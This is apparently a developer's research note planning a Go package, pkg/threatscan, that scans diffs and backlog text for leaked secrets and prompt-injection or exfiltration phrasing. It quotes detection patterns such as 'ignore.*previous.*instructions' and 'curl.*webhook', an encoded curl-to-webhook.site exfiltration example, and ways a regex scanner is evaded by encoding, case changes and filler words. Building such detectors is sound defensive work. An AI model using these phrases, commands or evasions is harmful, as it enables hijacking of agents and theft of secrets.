# Research: Similar Features, Edge Cases, and Unstated Needs

Scope: research only for `pkg/threatscan` extraction (`project_plans/threatscan-extraction/requirements.md`). No source changes made.

## 1. Similar features in this codebase

### `pkg/classifier` — the closest structural precedent

[`pkg/classifier/classifier.go`](../../../pkg/classifier/classifier.go) is the only existing `session/`-independent, pattern/rule-based package and is explicitly named in requirements.md as the structural analog to check. Relevant conventions it already establishes that `pkg/threatscan` should mirror for consistency:

- **`Rule` struct** ([classifier.go:347-377](../../../pkg/classifier/classifier.go#L347-L377)) has `ID string` + `Name string` (short machine key vs. human label — same split the issue proposes for `ThreatMatch.PatternID`), a `Priority int` for evaluation order, an `Enabled bool`, and a `Source string` provenance tag (`"seed"`/`"user"`/`"claude-settings"`). `pkg/threatscan`'s pattern struct doesn't need `Source`, but `ID`/`Name`/`Priority`-shaped fields are a proven pattern in this repo.
- **`RuleBasedClassifier`** holds `rules []Rule` sorted by priority, guarded by `deadlock.RWMutex` (this repo's drop-in `sync.RWMutex` with deadlock detection) — `pkg/threatscan`'s pattern registry is read-only after init (regexes compiled once, no runtime rule editing), so a mutex likely isn't needed unless a future scope adds hot-reloadable patterns.
- **`ToolCategory*` constants** ([classifier.go:86-103](../../../pkg/classifier/classifier.go#L86-L103)) are the precedent for `pkg/threatscan`'s `Scope` enum: small `int`/string-backed constant sets with a doc comment per value explaining what it's for, not just what it's named.
- Tests use exhaustive table-driven cases per pattern category with descriptive subtests (`t.Run(tc.name, ...)`), matching what AC 8 asks for in `pkg/threatscan`.

`pkg/classifier` is larger in scope (also does Bash command parsing, shell-expansion detection, escalation policy) — `pkg/threatscan` should stay narrower: pure "does this text match a known-bad pattern" with no command-parsing or decision/escalation logic layered in (that belongs to the caller, same as `RunPreGateSecurityCheck` deciding to return an `error` today).

### `session/backlog_review.go` — the code being extracted

[`secretPatterns`](../../../session/backlog_review.go#L20-L39) is a package-level `[]struct{name string; re *regexp.Regexp}` with 12 entries, scanned linearly in [`RunPreGateSecurityCheck`](../../../session/backlog_review.go#L41-L52), which returns on the **first** match only (`for _, p := range secretPatterns { if p.re.MatchString(diff) { return fmt.Errorf(...) } }`). This is the current single-caller contract `pkg/threatscan` must preserve exactly for AC 5/10 (see `session/review_gate.go:277`, `session/backlog_review_test.go:533` for the no-raw-value-leak test).

No other regex-based content-scanning function exists in the repo outside `pkg/classifier` (command/shell parsing) and `secretPatterns` — confirmed via repo-wide grep for `ThreatMatch|threatscan|prompt injection|PromptInjection|exfiltrat` (zero hits) and for `RunPreGateSecurityCheck` (only the definition + the one call site + docs, per requirements.md's own audit).

### Industry reference (design inspiration only — not fetched, per instructions)

The GitHub issue text for #120 (and its dependent, #115) describes Hermes Agent's `tools/threat_patterns.py` as: a single pattern source of truth shared by every scanner in that codebase; patterns grouped by attack class with named IDs; three named scopes (`all`/`context`/`strict`) trading detection breadth for false-positive tolerance; and pattern comments justifying borderline inclusion/exclusion decisions. This description is treated purely as prior art/design shape — nothing was fetched from an external project.

Issue #120's **proposed file split** (already summarized in requirements.md's "Open questions"): `patterns.go` (registry + scope tags + named IDs), `scanner.go` (`Scan(content string, scope Scope) []ThreatMatch`), `result.go` (`ThreatMatch{PatternID, Scope, Excerpt string}`).

**Design tension worth flagging for the plan phase**: issue #120's proposed `ThreatMatch` struct includes an `Excerpt string` field, with the same issue text saying "never include the matched value in logs." Requirements.md's AC 2 is stricter and unambiguous: "the matched value is never included in any returned error, log line, **or `ThreatMatch` field**." If `Excerpt` is kept, it must be a bounded, non-matched-value excerpt (e.g. surrounding context with the match itself redacted) or it must be dropped — a plain "raw excerpt around the match" field cannot exist without indirectly leaking the matched value through struct fields. Companion issue #115 (dependent on #120) proposes a *different* result shape, `ThreatResult{PatternID, Scope, Blocked bool}` (no excerpt at all) for its own scan-and-decide callers — worth reconciling which shape `pkg/threatscan` actually exports, since the two issues don't agree with each other.

## 2. `session/backlog_context.go` compatibility check (companion #115, wiring out of scope here)

[`session/backlog_context.go`](../../../session/backlog_context.go) has **no existing threat/injection scanning** — confirmed by reading the full file (231 lines). What it does have, which `pkg/threatscan`'s design needs to stay compatible with even though wiring it in is out of scope for this item:

- **`sanitizeField(s string, maxLen int)`** ([backlog_context.go:20-27](../../../session/backlog_context.go#L20-L27)): strips *all* HTML tags via `htmlTagRe = regexp.MustCompile(`<[^>]+>`)`, then truncates to `maxLen` with a `" [truncated]"` suffix. This is HTML-stripping + truncation only — it does **not** scan content for injection/exfiltration patterns today. It's used pervasively across `BuildReviewPrompt`, `BuildHeadlessReviewPrompt`, `BuildSessionInitialPrompt`, etc. for description/notes/AC-text/verdict-summary fields.
- **`truncateField(s string, maxLen int)`** ([backlog_context.go:29-37](../../../session/backlog_context.go#L29-L37)): truncation only, no HTML stripping — used for structured fields like the item title, on the stated rationale that "the envelope context renders injection payloads inert and stripping content would be destructive."
- **`SanitizeDiff` / `sanitizeDiff`** ([backlog_review.go:606-616](../../../session/backlog_review.go#L606-L616)): unrelated concern — neutralizes ``` ``` ``` sequences so diff content can't close a markdown code fence, not a threat scanner.

**Critical ordering incompatibility if #115 later wires `pkg/threatscan` in naively**: `sanitizeField` strips HTML tags *before* any hypothetical threatscan call downstream would see the text. AC 6's "hidden HTML elements (`display:none`, HTML comment injection)" pattern category can only ever fire on fields that reach the scanner **before** `sanitizeField`'s `htmlTagRe.ReplaceAllString(s, "")` runs — by the time a caller has already sanitized a field for prompt-safety, the HTML tags (and thus the `display:none`/`<!-- -->` evidence) are already gone. `pkg/threatscan`'s `Scan` needs to be documented as operating on **raw, pre-sanitization** content, and any future #115 integration must call it *before* `sanitizeField`/`truncateField`, not after. This item doesn't need to fix the ordering (out of scope), but the package's doc comments and `Scan` signature should make the expected calling position explicit so #115 doesn't get it backwards.

Similarly, `truncateField`-only fields (title) truncate without HTML stripping — a `Scan` call for those fields, if `#115` adds one, must run before truncation too, or a pattern spanning the truncation boundary (e.g. a fuzzy-bypass injection phrase split by the `" [truncated]"` cut point) will silently stop matching.

## 3. Edge cases and failure modes the design should handle

- **Multi-line diffs**: `regexp.MustCompile` patterns in Go default to non-multiline, `.`-doesn't-match-newline semantics. `RunPreGateSecurityCheck` currently calls `p.re.MatchString(diff)` against the *entire* diff string at once (not line-by-line), so any pattern using `.*` between tokens (e.g. AC 6's `send.*to.*http`, `ignore.*previous.*instructions`) will silently fail to match if the two tokens are split across a newline in the diff — a very plausible case for a git diff, where added/removed lines each carry their own `+`/`-` prefix. The migrated patterns need `(?s)` (dot-matches-newline) where a fuzzy/cross-token pattern is expected to span line breaks, or an explicit test proving the intended behavior either way.
- **Base64-encoded secrets/payloads**: none of the current 12 `secretPatterns` nor AC 6's new categories attempt to decode base64 — a secret or injection payload wrapped in base64 (common in "helpfully" base64'd tool output, or an attacker deliberately encoding to evade scanning) will not match any pattern as-is. Out of scope per AC 6's "at minimum" framing, but worth naming explicitly as a known gap rather than silently absent, since it's the most obvious evasion technique for a regex-only scanner.
- **Patterns matching across escaped/encoded content**: JSON-escaped diffs (`\"`, `\\n`), URL-encoded fragments (`%20`, `%2F`), or HTML-entity-encoded content (`&lt;`, `&#x3C;`) can break token-adjacency assumptions in a pattern the same way a literal newline can. `curl.*webhook` won't match `curl%20--data%20@-%20webhook.site` style encoded commands. Same conclusion as above: name the gap, don't silently claim coverage AC 6 doesn't ask for.
- **False positives on legitimate content that discusses these patterns as examples**: AC 8 explicitly requires a guard test against realistic `AGENTS.md`-style content. This repo's own `CLAUDE.md`/`.claude/rules/*.md` files are a ready-made real-world corpus of exactly this risk — e.g. this very research task's prompt contains phrases like "ignore.*previous.*instructions" and "curl.*webhook" as literal pattern-description text, and `.claude/rules/*.md` files routinely include example attacker phrasing in "Wrong:"/"Right:" code blocks for other unrelated rules. A pattern tuned too broadly (e.g. matching bare `"ignore"` + `"instructions"` anywhere in a paragraph) will false-positive on any doc that *talks about* prompt injection defenses, not just documents that *contain* an injection attempt. The fuzzy-bypass requirement (AC 7) and the false-positive guard (AC 8) are in direct tension — loosening a pattern to catch `"ignore all the previous silly instructions"` moves it closer to also catching a security-rules doc's own explanatory prose, so the pattern needs deliberately bounded fuzziness (a small, fixed max filler-word count, not unbounded `.*`) rather than maximal recall.
- **Regex catastrophic backtracking / ReDoS**: fuzzy-bypass patterns that insert `\s+(?:\w+\s+)*` (Hermes' documented approach, referenced in issue #115) between tokens are exactly the shape known to cause catastrophic backtracking in naive regex engines on adversarial input (long non-matching filler). Go's `regexp` package uses RE2 semantics (linear time, no backtracking) so this specific failure mode is a non-issue in Go — worth stating explicitly in the design doc as "why we don't need to worry about ReDoS here," since a reviewer unfamiliar with RE2's guarantees may otherwise flag it.
- **Case sensitivity / Unicode normalization bypass**: secret patterns like `AKIA[0-9A-Z]{16}` are deliberately case-sensitive (AWS key IDs are always uppercase, so this is correct), but new prompt-injection patterns like "ignore previous instructions" need `(?i)` or they're trivially bypassed by "IGNORE PREVIOUS INSTRUCTIONS" or mixed case. None of AC 6's listed example patterns show a case-insensitivity flag in the issue text — this should be an explicit, tested design decision per pattern category, not an oversight.
- **Empty / nil diff**: `RunPreGateSecurityCheck("")` today returns `nil` (no patterns match empty string) — trivial, but the migrated `Scan` should preserve this (empty content → empty match slice, not an error).

## 4. Unstated needs beyond the explicit AC list

- **Aggregation/dedup of multiple matches on the same span**: the issue's proposed `Scan(content string, scope Scope) []ThreatMatch` returns *all* matches, a behavior change from `RunPreGateSecurityCheck`'s current first-match-wins short-circuit. Nothing in the requirements or issue text specifies what happens when two different patterns (e.g. `generic_bearer` and a new `exfiltration` pattern) both match overlapping or identical spans of the same content — should `Scan` return both `ThreatMatch` entries, dedup by span, dedup by pattern category, or something else? This needs a decision in the plan phase; the AC list is silent on it. The safest default consistent with "named pattern IDs, no matched value" is to return one `ThreatMatch` per pattern that matched at least once (not one per occurrence within the content), since without the matched substring in the result there's no way for a caller to distinguish "pattern X matched twice" from "pattern X matched once" anyway.
- **First-match-only vs. return-all-matches, and who's responsible for the difference**: requirements.md's "Open questions" section already flags this as the key design fork (thin wrapper in `session/` vs. direct migration to the new API), but it's worth stating the concrete compatibility requirement explicitly: whatever `Scan`'s semantics are, `RunPreGateSecurityCheck`'s caller-visible contract (AC 5, AC 10) is first-match-wins with a single named pattern in the error string — so if `Scan` returns `[]ThreatMatch` (all matches), the `session/backlog_review.go` wrapper must explicitly take only `matches[0]` (or iterate and format only the first) to preserve today's message shape byte-for-byte, not just semantically.
- **Ordering guarantee for "first" match**: if `Scan` returns `[]ThreatMatch` and a caller needs "the first match" for backward compatibility (per above), the registry's iteration order must be deterministic and match `secretPatterns`' current declaration order (AKIA before github_pat before openai_key, etc.) — a map-backed registry would need an explicit stable sort (e.g. by `Priority` then `PatternID`, mirroring `pkg/classifier`'s priority-sorted `[]Rule`) to avoid silently changing which pattern's name appears in the error/verdict summary for a diff that happens to match two patterns at once. This is directly testable and should have its own unit test, since it's exactly the kind of thing that silently regresses on a later PR that adds a pattern.
- **Where scope filtering happens**: requirements.md's own "Open questions" already surfaces this (per-pattern scope tags vs. filter-at-query-time over a shared list) — noting here only that whichever is chosen, it needs to compose cleanly with the "return all matches, then take first for back-compat" need above: filtering by scope must happen *before* determining "first match," not after, or a `ScopeStrict`-only caller could see a match that only exists in `ScopeAll`.
- **No caller currently exists for the new pattern categories**: AC 6 explicitly says the new categories don't need to be wired into `RunPreGateSecurityCheck`'s call site. This means AC 8's unit tests are the *only* consumer of those code paths until #115 lands — worth flagging so the plan phase treats those tests as load-bearing correctness proof, not just coverage padding, since there's no second, independent caller exercising the new patterns in production yet.
